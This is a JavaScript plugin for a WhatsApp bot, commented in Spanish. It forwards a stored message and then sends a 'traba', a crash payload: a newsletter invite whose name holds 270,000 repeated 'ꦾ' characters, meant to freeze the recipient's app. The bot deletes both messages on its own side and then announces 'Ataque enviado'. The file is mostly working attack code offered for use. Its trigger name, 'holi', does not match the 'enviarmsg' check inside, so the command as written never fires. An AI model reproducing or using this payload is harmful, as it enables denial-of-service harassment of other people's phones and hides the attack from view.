import fs from 'fs';

const FILE_PATH = './mensajes_guardados.json';

let handler = async (m, { conn, command }) => {
  // 1. Verificar que NO esté en grupo
  if (m.isGroup) {
    return m.reply('❌ Este comando no puede usarse en grupos.');
  }

  // 2. Verificar que lo ejecuta el bot (número vinculado)
  const botNumber = conn.user?.jid || '';
  if (m.sender !== botNumber) {
    return m.reply('❌ Este comando solo puede usarlo el número vinculado al bot.');
  }

  if (command === 'enviarmsg') {
    try {
      if (!fs.existsSync(FILE_PATH)) {
        return m.reply('❌ No hay mensaje guardado.');
      }

      const mensaje = JSON.parse(fs.readFileSync(FILE_PATH, 'utf-8'));

      if (!mensaje || !mensaje.message) {
        return m.reply('❌ El archivo está dañado o incompleto.');
      }

      // 3. Enviar el mensaje desde archivo
      const enviado1 = await conn.copyNForward(m.chat, mensaje, true);

      // 4. Eliminar para el bot localmente
      await conn.sendMessage(m.chat, {
        delete: {
          remoteJid: m.chat,
          fromMe: true,
          id: enviado1.key.id,
          participant: botNumber
        }
      });

      // 5. Enviar traba tipo newsletter
      const travas = 'ꦾ'.repeat(90000);
      const mensaje2 = {
        newsletterAdminInviteMessage: {
          newsletterJid: "120363282786345717@newsletter",
          newsletterName: "🗣🗣🗣🗣" + travas + travas + travas,
          jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
          caption: "By Tobi",
          inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
        }
      };

      const enviado2 = await conn.relayMessage(m.chat, mensaje2, {});

      // 6. Eliminar traba localmente para el bot
      await conn.sendMessage(m.chat, {
        delete: {
          remoteJid: m.chat,
          fromMe: true,
          id: enviado2.key.id,
          participant: botNumber
        }
      });

      await conn.sendMessage(m.chat, { text: '😼 Ataque enviado' }, { quoted: m });

    } catch (e) {
      console.error('[ERROR enviarmsg]:', e);
      return m.reply('❌ Error al ejecutar el comando:\n' + e.message);
    }
  }
};

handler.command = ['holi'];
export default handler;